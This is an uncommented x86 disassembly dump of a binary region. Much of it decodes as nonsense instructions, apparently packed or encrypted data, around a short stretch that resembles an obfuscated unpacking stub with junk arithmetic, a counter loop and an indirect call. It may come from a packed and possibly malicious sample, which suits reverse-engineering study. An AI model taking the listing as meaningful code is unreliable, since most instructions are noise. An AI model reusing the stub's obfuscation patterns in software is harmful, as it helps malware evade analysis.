  40d85b:	shl    BYTE PTR [edx-0x5ac56ed8],0xa8
  40d862:	mov    ds:0xb5e6111,al
  40d867:	shl    DWORD PTR [edx-0x5f1f6ff9],1
  40d86d:	(bad)  
  40d86e:	xor    ah,BYTE PTR [edi+0x72691f07]
  40d874:	pop    ebx
  40d875:	mov    ch,0x64
  40d877:	lea    ebx,[ebx-0x2e]
  40d87a:	xchg   ebp,eax
  40d87b:	retf   0x9a77
  40d87e:	fsubr  DWORD PTR [ebx+0x6ad124ad]
  40d884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d885:	xor    ch,BYTE PTR [edi-0x20]
  40d888:	add    al,0x6d
  40d88a:	(bad)  
  40d88b:	(bad)  
  40d88c:	cmp    dl,ch
  40d88e:	xor    edx,esp
  40d890:	push   eax
  40d891:	or     esp,ebp
  40d893:	inc    ebx
  40d894:	dec    ecx
  40d895:	jbe    0x40d839
  40d897:	es xor eax,ebx
  40d89a:	mov    ebx,0xd4271e2
  40d89f:	jl     0x40d84e
  40d8a1:	mov    esi,0xd5b1f7f0
  40d8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8a7:	jo     0x40d87c
  40d8a9:	hlt    
  40d8aa:	pusha  
  40d8ab:	jmp    0x40d8e5
  40d8ad:	(bad)  
  40d8ae:	ins    BYTE PTR es:[edi],dx
  40d8af:	inc    ebp
  40d8b0:	cdq    
  40d8b1:	cmp    ecx,esi
  40d8b3:	inc    ebp
  40d8b4:	sahf   
  40d8b5:	out    0x74,eax
  40d8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b8:	stos   DWORD PTR es:[edi],eax
  40d8b9:	pushf  
  40d8ba:	xor    ch,ch
  40d8bc:	es cs pop edx
  40d8bf:	das    
  40d8c0:	push   esp
  40d8c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c2:	xor    eax,0x1d9ef602
  40d8c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8c8:	dec    ecx
  40d8c9:	sub    al,0x2a
  40d8cb:	(bad)  
  40d8cc:	xor    al,0x9b
  40d8ce:	add    cl,dl
  40d8d0:	mov    ebx,0x8ec59b2f
  40d8d5:	mov    edx,0x73ed14a6
  40d8da:	jecxz  0x40d861
  40d8dc:	sahf   
  40d8dd:	dec    ebx
  40d8de:	cmp    al,0x83
  40d8e0:	inc    ebp
  40d8e1:	popf   
  40d8e2:	push   esp
  40d8e3:	outs   dx,DWORD PTR ds:[esi]
  40d8e4:	imul   ecx,DWORD PTR [esi-0x6c],0xffffffec
  40d8e8:	xchg   esp,eax
  40d8e9:	(bad)  
  40d8ea:	hlt    
  40d8eb:	popa   
  40d8ec:	jg     0x40d945
  40d8ee:	mov    cl,0xa1
  40d8f0:	pop    edx
  40d8f1:	inc    ebx
  40d8f2:	jge    0x40d8a5
  40d8f4:	or     eax,0xf2285a4
  40d8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8fa:	fwait
  40d8fb:	or     ebx,esi
  40d8fd:	lea    edx,[ebp+0x49816cc3]
  40d903:	jg     0x40d917
  40d905:	mov    esi,0x6a85ffc4
  40d90a:	out    dx,eax
  40d90b:	inc    ebx
  40d90c:	dec    edi
  40d90d:	imul   edx,DWORD PTR [edx],0xffffffdb
  40d910:	fisubr WORD PTR [ebp+0x6cb305c6]
  40d916:	xchg   ebx,eax
  40d917:	mov    dh,0x9b
  40d919:	cmc    
  40d91a:	pop    ecx
  40d91b:	js     0x40d952
  40d91d:	and    al,0xe7
  40d91f:	cs (bad) 
  40d921:	mov    dl,0x3e
  40d923:	in     eax,dx
  40d924:	nop
  40d925:	in     eax,dx
  40d926:	outs   dx,BYTE PTR ds:[esi]
  40d927:	adc    dh,bl
  40d929:	loopne 0x40d986
  40d92b:	in     eax,dx
  40d92c:	add    DWORD PTR [esi+0x23d9ffd3],0x9e8dbec4
  40d936:	fdivr  QWORD PTR [ebp+ebx*2+0x68]
  40d93a:	pop    edi
  40d93b:	(bad)  
  40d93c:	mov    cl,0x20
  40d93e:	call   0x2ddaf668
  40d943:	xor    DWORD PTR [ebx-0x34],ebp
  40d946:	popf   
  40d947:	jnp    0x40d9b2
  40d949:	push   ebp
  40d94a:	out    dx,eax
  40d94b:	loop   0x40d9b3
  40d94d:	into   
  40d94e:	std    
  40d94f:	sub    al,0x31
  40d951:	jmp    0xf32d:0x288e67e9
  40d958:	iret   
  40d959:	mov    ah,bl
  40d95b:	cmc    
  40d95c:	pop    edi
  40d95d:	out    dx,al
  40d95e:	cmp    al,0xad
  40d960:	adc    eax,0xc172eb3c
  40d965:	xchg   BYTE PTR [esi+0x50],dh
  40d968:	fstp   DWORD PTR [edx+0x59112acc]
  40d96e:	cdq    
  40d96f:	call   0x25e6:0xf432c25d
  40d976:	mov    edx,0xfc53607f
  40d97b:	int3   
  40d97c:	ds pop eax
  40d97e:	push   0xe76637a4
  40d983:	nop
  40d984:	aad    0xc4
  40d986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d987:	rol    DWORD PTR [esi-0x7f2d18d8],1
  40d98d:	or     eax,DWORD PTR [esi+0x39]
  40d990:	xchg   edi,eax
  40d991:	cwde   
  40d992:	and    BYTE PTR [ecx],0x96
  40d995:	push   eax
  40d996:	sub    edi,ebp
  40d998:	inc    edi
  40d999:	test   al,0xb2
  40d99b:	dec    esi
  40d99c:	dec    edi
  40d99d:	stos   DWORD PTR es:[edi],eax
  40d99e:	dec    ecx
  40d99f:	enter  0x20e,0x17
  40d9a3:	jns    0x40d983
  40d9a5:	mov    edi,esp
  40d9a7:	enter  0xe10e,0x52
  40d9ab:	es in  eax,dx
  40d9ad:	inc    ebp
  40d9ae:	cs cmc 
  40d9b0:	jno    0x40d99e
  40d9b2:	xchg   esi,eax
  40d9b3:	icebp  
  40d9b4:	bound  ecx,QWORD PTR [esi+0x1f]
  40d9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9b8:	popa   
  40d9b9:	and    al,0x24
  40d9bb:	mov    ah,0x96
  40d9bd:	in     al,0x5
  40d9bf:	pop    edx
  40d9c0:	or     eax,0xcc1c872d
  40d9c5:	or     al,0x67
  40d9c7:	xor    dl,BYTE PTR [edi+0x5acdb3da]
  40d9cd:	xchg   esp,eax
  40d9ce:	xchg   ebx,eax
  40d9cf:	es test eax,0x9104c056
  40d9d5:	inc    esi
  40d9d6:	add    BYTE PTR [edi-0x49],bl
  40d9d9:	xchg   edx,eax
  40d9da:	sbb    eax,0x3043d40a
  40d9df:	ret    
  40d9e0:	inc    ebx
  40d9e1:	cli    
  40d9e2:	sbb    eax,0x176cb382
  40d9e7:	test   DWORD PTR [ecx],edi
  40d9e9:	imul   edi,DWORD PTR [ecx],0x7decca6c
  40d9ef:	inc    edi
  40d9f0:	test   DWORD PTR [edx-0x7],edi
  40d9f3:	jg     0x40da10
  40d9f5:	xor    ecx,esi
  40d9f7:	iret   
  40d9f8:	mov    esp,DWORD PTR [eax-0x22]
  40d9fb:	xchg   DWORD PTR [ecx],edi
  40d9fd:	pop    ecx
  40d9fe:	xor    dl,BYTE PTR [ecx-0x2b991651]
  40da04:	fcomp  QWORD PTR [di-0x4dba]
  40da09:	popa   
  40da0a:	lds    ebx,FWORD PTR [edx]
  40da0c:	fadd   st(1),st
  40da0e:	fwait
  40da0f:	mov    ecx,0xb525f086
  40da14:	xor    al,0xbd
  40da16:	lods   eax,DWORD PTR ds:[esi]
  40da17:	pop    esp
  40da18:	mov    bl,0x32
  40da1a:	pop    edx
  40da1b:	cmp    al,0x3b
  40da1d:	mov    edx,0x3f6f8232
  40da22:	mov    BYTE PTR [ecx+0x7c524fb8],0x43
  40da29:	dec    ecx
  40da2a:	cs dec eax
  40da2c:	jmp    0x2f09f688
  40da31:	mov    ah,BYTE PTR [esp+edi*8-0x6424373e]
  40da38:	int    0x57
  40da3a:	pop    esi
  40da3b:	lea    esi,[ecx+edx*2-0xde6ef34]
  40da42:	imul   edi,ebp,0x79485ec8
  40da48:	mov    esp,0xa604c2bc
  40da4d:	daa    
  40da4e:	outs   dx,DWORD PTR ds:[esi]
  40da4f:	adc    al,0x2
  40da51:	add    DWORD PTR [ebx+0x4ea05c16],eax
  40da57:	mov    BYTE PTR [ecx+ebp*4-0x21],0xef
  40da5c:	stc    
  40da5d:	mov    ah,0xd5
  40da5f:	sahf   
  40da60:	repnz stc 
  40da62:	sub    esp,DWORD PTR [ebx+0x54691b03]
  40da68:	or     BYTE PTR [eax+ebp*8+0x4693bbc4],al
  40da6f:	das    
  40da70:	in     eax,0xdf
  40da72:	fs (bad) 
  40da74:	outs   dx,BYTE PTR ds:[esi]
  40da75:	jns    0x40da1b
  40da77:	(bad)  
  40da78:	mov    bh,0xfa
  40da7a:	mov    dl,0xa2
  40da7c:	add    ebp,DWORD PTR [eax+ebp*8]
  40da7f:	push   es
  40da80:	stos   BYTE PTR es:[edi],al
  40da81:	jle    0x40daab
  40da83:	out    dx,eax
  40da84:	mov    bl,BYTE PTR ds:0x87ee87fd
  40da8a:	ins    BYTE PTR es:[edi],dx
  40da8b:	jns    0x40da13
  40da8d:	mov    bl,0xbb
  40da8f:	jnp    0x40dab4
  40da91:	hlt    
  40da92:	sbb    dh,ah
  40da94:	mov    DWORD PTR [ecx],edx
  40da96:	pop    ds
  40da97:	fdivp  st(4),st
  40da99:	(bad)  
  40da9a:	mov    ds,WORD PTR [edx+0x9]
  40da9d:	dec    edx
  40da9e:	mov    edi,0xd458a630
  40daa3:	out    dx,al
  40daa4:	ret    0xbc84
  40daa7:	mov    ds:0x2a4d09c8,eax
  40daac:	pop    esp
  40daad:	pop    ebx
  40daae:	ror    BYTE PTR [ebx],0xab
  40dab1:	mov    edi,DWORD PTR [esp+esi*8+0x4]
  40dab5:	lds    ebx,FWORD PTR ds:0x2938a22
  40dabb:	cmp    al,0xd
  40dabd:	ret    
  40dabe:	fild   WORD PTR ds:0xb10faca0
  40dac4:	inc    eax
  40dac5:	shr    DWORD PTR [edi],0xa1
  40dac8:	fucom  st(1)
  40daca:	push   0xbb25f560
  40dacf:	cld    
  40dad0:	xchg   ecx,eax
  40dad1:	cmc    
  40dad2:	cwde   
  40dad3:	or     eax,0xd99e2de0
  40dad8:	call   0x9713dfaa
  40dadd:	jg     0x40db04
  40dadf:	in     eax,dx
  40dae0:	arpl   WORD PTR [ecx+ebp*2-0x10],si
  40dae4:	scas   al,BYTE PTR es:[edi]
  40dae5:	push   0xffffff87
  40dae7:	leave  
  40dae8:	pop    eax
  40dae9:	xor    dh,bl
  40daeb:	into   
  40daec:	(bad)
  40daef:	xchg   esp,eax
  40daf0:	sti    
  40daf1:	lods   eax,DWORD PTR ds:[esi]
  40daf2:	sub    DWORD PTR [ecx-0x48],ebx
  40daf5:	rcr    DWORD PTR [esi],0x22
  40daf8:	jecxz  0x40db42
  40dafa:	retf   
  40dafb:	mov    cl,dl
  40dafd:	push   0x8b6fee1
  40db02:	test   BYTE PTR [edi-0x50517697],0xe2
  40db09:	and    eax,0xb0ba6b3a
  40db0e:	adc    DWORD PTR [ecx],ebp
  40db10:	xchg   esi,eax
  40db11:	mov    ch,0x7f
  40db13:	dec    ebp
  40db14:	xchg   edx,eax
  40db15:	dec    ecx
  40db16:	popa   
  40db17:	lea    edi,[ebx]
  40db19:	sbb    esp,DWORD PTR [edi+0x597e0512]
  40db1f:	in     al,0xdc
  40db21:	mov    eax,ds:0x71836e09
  40db26:	mov    dl,0x1f
  40db28:	mov    BYTE PTR [ebx+0x45eee36f],ch
  40db2e:	scas   al,BYTE PTR es:[edi]
  40db2f:	shl    DWORD PTR [edx+0x32],cl
  40db32:	push   ds
  40db33:	add    al,0xd7
  40db35:	xor    eax,0xfe40be40
  40db3a:	sub    al,0xf3
  40db3c:	pop    DWORD PTR [ebp-0x39717e84]
  40db42:	pushf  
  40db43:	ret    0xff95
  40db46:	add    al,0xe9
  40db48:	daa    
  40db49:	inc    ebp
  40db4a:	dec    esp
  40db4b:	sti    
  40db4c:	jo     0x40daef
  40db4e:	or     eax,DWORD PTR [ebx+0x2fe98e5b]
  40db54:	outs   dx,DWORD PTR ds:[esi]
  40db55:	lods   eax,DWORD PTR ds:[esi]
  40db56:	mov    ds:0xf8632dba,eax
  40db5b:	pop    ebp
  40db5d:	pop    ecx
  40db5e:	(bad)  
  40db5f:	retf   0x3315
  40db62:	jbe    0x40dbca
  40db64:	push   ebx
  40db65:	idiv   eax
  40db67:	ss push edx
  40db69:	enter  0xff6a,0x35
  40db6d:	rcl    DWORD PTR [edi-0x39833a27],0xf4
  40db74:	pop    DWORD PTR [esi]
  40db76:	les    ebx,FWORD PTR [esi+0x7e97f0ef]
  40db7c:	fs xchg edi,eax
  40db7e:	xchg   ebx,eax
  40db7f:	xchg   ebp,eax
  40db80:	lahf   
  40db81:	mov    ah,0x2b
  40db83:	je     0x40dbcb
  40db85:	adc    eax,0xe023a91d
  40db8a:	mov    bh,0x10
  40db8c:	daa    
  40db8d:	xchg   ebx,eax
  40db8e:	call   0x4fa18557
  40db93:	push   ds
  40db94:	cmp    esi,edi
  40db96:	mov    esi,0x34caeb0a
  40db9b:	gs leave 
  40db9d:	(bad)  
  40db9e:	adc    al,0xf9
  40dba0:	mov    esi,0xc96fafa6
  40dba5:	lahf   
  40dba6:	je     0x40db29
  40dba8:	xor    ecx,DWORD PTR [eax]
  40dbaa:	xchg   edx,eax
  40dbab:	aas    
  40dbac:	pop    ebp
  40dbad:	in     al,0x72
  40dbaf:	jp     0x40db93
  40dbb1:	cwde   
  40dbb2:	out    dx,al
  40dbb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbb4:	inc    esp
  40dbb5:	cld    
  40dbb6:	fstp   DWORD PTR [ebx-0x63]
  40dbb9:	ja     0x40dba5
  40dbbb:	push   ebx
  40dbbc:	enter  0x5ca6,0x97
  40dbc0:	inc    edi
  40dbc1:	cmp    esi,edi
  40dbc3:	imul   edx,DWORD PTR [ebx-0x36],0x51
  40dbc7:	xchg   ecx,esi
  40dbc9:	mov    bh,0x43
  40dbcb:	sbb    bl,BYTE PTR [eax-0x7c]
  40dbce:	stos   DWORD PTR es:[edi],eax
  40dbcf:	mov    al,ds:0xfc4d038
  40dbd4:	sbb    esi,DWORD PTR [ecx-0x6d]
  40dbd7:	cmp    al,0x78
  40dbd9:	shl    esp,0x54
  40dbdc:	xchg   ch,al
  40dbde:	test   DWORD PTR [ecx-0x1],eax
  40dbe1:	fwait
  40dbe2:	out    0xfc,eax
  40dbe4:	or     bh,BYTE PTR [esp+edx*2]
  40dbe7:	das    
  40dbe8:	out    0x64,eax
  40dbea:	rol    al,0xfc
  40dbed:	scas   al,BYTE PTR es:[edi]
  40dbee:	mov    cl,0x9e
  40dbf0:	dec    edx
  40dbf1:	sbb    eax,0xe31151c5
  40dbf6:	and    DWORD PTR [edi+0x5bb5e1bb],esi
  40dbfc:	mov    dl,0xf
  40dbfe:	shl    cl,0x82
  40dc01:	leave  
  40dc02:	fdivr  QWORD PTR [eax+ebp*1-0xa1979bc]
  40dc09:	sbb    al,0xae
  40dc0b:	mov    cl,0x7f
  40dc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc0e:	cmp    eax,0xbcfdc620
  40dc13:	shl    BYTE PTR [esi],1
  40dc15:	cmp    eax,0x5461b123
  40dc1a:	nop
  40dc1b:	sub    eax,ebp
  40dc1d:	xchg   esi,eax
  40dc1e:	(bad)  
  40dc20:	int    0x55
  40dc22:	jl     0x40dc6b
  40dc24:	lods   eax,DWORD PTR ds:[esi]
  40dc25:	dec    DWORD PTR [eax+0x193e4ac5]
  40dc2b:	xor    BYTE PTR [ecx],0xd3
  40dc2e:	mov    ebx,0xa5a7987d
  40dc33:	xchg   edx,esi
  40dc35:	(bad)
  40dc38:	ret    0x6c56
  40dc3b:	xchg   esp,eax
  40dc3c:	sub    al,0x2c
  40dc3e:	and    eax,DWORD PTR ds:0xc02b7af
  40dc44:	sbb    ch,dl
  40dc46:	mov    ebp,0x20891802
  40dc4b:	sub    eax,0xdb2305ca
  40dc50:	int    0x9b
  40dc52:	clc    
  40dc53:	or     al,0x8d
  40dc55:	and    eax,0x2891ae99
  40dc5a:	adc    DWORD PTR [edx+0x1c82ae7],eax
  40dc60:	mov    al,ds:0x5b3015db
  40dc65:	inc    ecx
  40dc66:	xchg   edx,eax
  40dc67:	loopne 0x40dcbf
  40dc69:	and    ch,cl
  40dc6b:	data16 jbe 0x40dcc3
  40dc6e:	test   bl,bh
  40dc70:	jo     0x40dce6
  40dc72:	mov    esp,0x4ee4c461
  40dc77:	not    DWORD PTR [ebp-0x17]
  40dc7a:	mov    edi,0xfabf2676
  40dc7f:	inc    eax
  40dc80:	mov    al,0x16
  40dc82:	nop
  40dc83:	popa   
  40dc84:	stc    
  40dc85:	xchg   ecx,eax
  40dc86:	lds    ecx,FWORD PTR [ebx+0x279d1b7d]
  40dc8c:	add    edx,edi
  40dc8e:	or     al,0xbb
  40dc90:	jmp    0x40dcc1
  40dc92:	ja     0x40dc8c
  40dc94:	ficomp WORD PTR [ebx]
  40dc96:	inc    edi
  40dc97:	cli    
  40dc98:	mov    ebx,0x2d0a0148
  40dc9d:	sti    
  40dc9e:	pop    ss
  40dc9f:	adc    edx,DWORD PTR [ebp-0x5a32c957]
  40dca5:	adc    eax,0xbbdc51ef
  40dcaa:	xchg   esp,eax
  40dcab:	pushf  
  40dcac:	add    BYTE PTR [di-0x298f],bh
  40dcb1:	sub    cl,BYTE PTR [esp+edx*8-0x48]
  40dcb5:	jmp    0x40dd2a
  40dcb7:	rcl    DWORD PTR [eax-0x4066bdb],cl
  40dcbd:	int3   
  40dcbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcbf:	repnz or al,0xb7
  40dcc2:	or     al,BYTE PTR ds:0xfceae6ef
  40dcc8:	ds scas eax,DWORD PTR es:[edi]
  40dcca:	stos   DWORD PTR es:[edi],eax
  40dccb:	(bad)  
  40dccc:	fcom   DWORD PTR [edx+0x370f496d]
  40dcd2:	ss xor esi,esi
  40dcd5:	or     BYTE PTR [edi-0x4],dh
  40dcd8:	pusha  
  40dcd9:	dec    ebp
  40dcda:	push   ss
  40dcdb:	xor    eax,0x8ebe1818
  40dce0:	and    bh,BYTE PTR ds:0x3289d171
  40dce6:	inc    esi
  40dce7:	retf   
  40dce8:	cli    
  40dce9:	(bad)  
  40dcea:	cmc    
  40dceb:	mov    ds:0xd0cd7519,eax
  40dcf0:	aas    
  40dcf1:	cmp    DWORD PTR [eax],0xb3cfd997
  40dcf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf8:	into   
  40dcf9:	push   0x72
  40dcfb:	js     0x40dd3e
  40dcfd:	lock les ebp,FWORD PTR es:[eax+0x17504b7c]
  40dd05:	test   al,0x94
  40dd07:	bound  ecx,QWORD PTR [ebx]
  40dd09:	add    al,0x9a
  40dd0b:	dec    esp
  40dd0c:	xor    al,0xb3
  40dd0e:	int3   
  40dd0f:	std    
  40dd10:	sar    DWORD PTR [esi+ebp*2-0xadf4866],0x80
  40dd18:	call   0x280f:0x72820c59
  40dd1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd20:	leave  
  40dd21:	fwait
  40dd22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd23:	mov    ebp,0x7c2d5582
  40dd28:	xchg   BYTE PTR [edx-0x3b],bl
  40dd2b:	icebp  
  40dd2c:	hlt    
  40dd2d:	aam    0x11
  40dd2f:	je     0x40dcb6
  40dd31:	dec    esp
  40dd32:	retf   
  40dd33:	push   0x969b2f92
  40dd38:	push   ebp
  40dd39:	or     DWORD PTR [ebx-0x36],0xfc6a0be
  40dd40:	add    eax,DWORD PTR [edx-0x2e]
  40dd43:	(bad)  
  40dd44:	mov    DWORD PTR [ebp+ebx*1-0x22],edx
  40dd48:	push   esi
  40dd49:	sar    DWORD PTR [ecx-0x6b2491b1],0xd7
  40dd50:	xor    bh,BYTE PTR [esi-0x16]
  40dd53:	clc    
  40dd54:	and    bh,bh
  40dd56:	into   
  40dd57:	push   edx
  40dd58:	or     ecx,DWORD PTR [edx+edx*8+0x75]
  40dd5c:	mov    ch,0xa
  40dd5e:	mov    bh,0x27
  40dd60:	or     bl,BYTE PTR [eax+0x4c]
  40dd63:	mov    ebp,0x39834e97
  40dd68:	jmp    0x5356:0x4702831b
  40dd6f:	repz cmp DWORD PTR [edi],edx
  40dd72:	or     DWORD PTR [edi],edi
  40dd74:	dec    edi
  40dd75:	imul   edx,DWORD PTR [eax+0x51],0xfffffff5
  40dd79:	outs   dx,BYTE PTR ds:[esi]
  40dd7a:	or     ebp,eax
  40dd7c:	loop   0x40ddf4
  40dd7e:	(bad)  
  40dd7f:	pusha  
  40dd80:	ins    DWORD PTR es:[edi],dx
  40dd81:	aam    0x6a
  40dd83:	and    DWORD PTR [edi+0x2],ebp
  40dd86:	pop    eax
  40dd87:	jo     0x40ddf1
  40dd89:	stos   BYTE PTR es:[edi],al
  40dd8a:	repz inc edi
  40dd8c:	test   al,0x1e
  40dd8e:	rol    BYTE PTR [ecx+0x6f226187],0x2
  40dd95:	icebp  
  40dd96:	not    BYTE PTR [edx]
  40dd98:	jp     0x40dd93
  40dd9a:	int    0x76
  40dd9c:	(bad)  
  40dd9d:	(bad)  
  40dd9e:	pop    ss
  40dd9f:	jno    0x40ddf1
  40dda1:	or     al,0xb1
  40dda3:	or     bh,BYTE PTR [ebx+0x78]
  40dda6:	jb     0x40dd65
  40dda8:	test   eax,eax
  40ddaa:	shl    ch,1
  40ddac:	clc    
  40ddad:	(bad)  
  40ddae:	push   esi
  40ddaf:	addr16 (bad) 
  40ddb1:	adc    ch,BYTE PTR [edi]
  40ddb3:	loopne 0x40de16
  40ddb5:	jno    0x40dde4
  40ddb7:	xor    al,al
  40ddb9:	pop    es
  40ddba:	rcl    BYTE PTR [ecx],1
  40ddbc:	addr16 in eax,dx
  40ddbe:	div    cl
  40ddc0:	popf   
  40ddc1:	dec    edi
  40ddc2:	test   eax,0x7d7633c1
  40ddc7:	out    0xdf,al
  40ddc9:	enter  0x9c6d,0xb4
  40ddcd:	in     al,0x80
  40ddcf:	fisub  WORD PTR [esi-0x556e91aa]
  40ddd5:	fild   DWORD PTR [esi+0x76cb5451]
  40dddb:	sub    BYTE PTR [edx+0x788e86a0],ch
  40dde1:	fisub  DWORD PTR [esi+0x6a63d35d]
  40dde7:	add    BYTE PTR [ecx+0x3d],ah
  40ddea:	dec    ebx
  40ddeb:	(bad)  [esi]
  40dded:	push   es
  40ddee:	push   0x593ee017
  40ddf3:	out    0xa0,al
  40ddf5:	inc    edi
  40ddf6:	mov    bh,0x33
  40ddf8:	popf   
  40ddf9:	dec    esi
  40ddfa:	sbb    BYTE PTR [ebp-0x51],dh
  40ddfd:	ins    DWORD PTR es:[edi],dx
  40ddfe:	ja     0x40de03
  40de00:	int    0x11
  40de02:	fs xor dh,ah
  40de05:	das    
  40de06:	pop    ds
  40de07:	mov    ecx,0xa9f1a2f2
  40de0c:	xchg   ecx,eax
  40de0d:	mov    ebp,0x2c237020
  40de12:	pop    edi
  40de13:	ja     0x40de77
  40de15:	dec    eax
  40de16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de17:	jb     0x40ddbc
  40de19:	or     BYTE PTR [ecx],dl
  40de1b:	mov    fs,esi
  40de1d:	in     al,0xa2
  40de1f:	pop    ecx
  40de20:	add    al,0x93
  40de22:	int3   
  40de23:	out    dx,eax
  40de24:	and    DWORD PTR [edx],0x1b
  40de27:	in     eax,0x78
  40de29:	cmp    eax,0x41baaaf1
  40de2e:	xchg   BYTE PTR [ecx+ebx*1-0x15],al
  40de32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de33:	call   0xb337:0xa7c67d14
  40de3a:	out    dx,eax
  40de3b:	les    edx,FWORD PTR [esi+ebx*1+0xa85d87c]
  40de42:	mov    ah,0x1d
  40de44:	pop    edx
  40de45:	pop    ebx
  40de46:	mov    al,0x94
  40de48:	das    
  40de49:	jl     0x40de45
  40de4b:	leave  
  40de4c:	retf   0x29aa
  40de4f:	adc    BYTE PTR [ebx-0x38ac03bb],cl
  40de55:	add    eax,0x42500c
  40de5a:	aam    0x32
  40de5c:	add    BYTE PTR [eax],al
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0xe4
  40dfd4:	add    ebx,ebp
  40dfd6:	jae    0x40df9d
  40dfd8:	shl    BYTE PTR [edx+0x62],cl
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x6c]
  40dfe0:	push   esp
  40dfe1:	add    eax,0xa24616f7
  40dfe6:	repz in al,dx
  40dfe8:	cmp    al,0xda
  40dfea:	inc    esi
  40dfeb:	daa    
  40dfec:	inc    edi
  40dfed:	jns    0x40e04f
  40dfef:	ins    DWORD PTR es:[edi],dx
  40dff0:	dec    ebx
  40dff1:	jle    0x40df82
  40dff3:	jnp    0x40df8f
  40dff5:	xchg   edi,eax
  40dff6:	aas    
  40dff7:	mov    si,0xd1cc
  40dffb:	inc    eax
  40dffc:	imul   ebp,ebx,0xefece609
  40e002:	mov    esi,0xeba0091d
  40e007:	lock adc bh,BYTE PTR [edx+0x41c94c6]
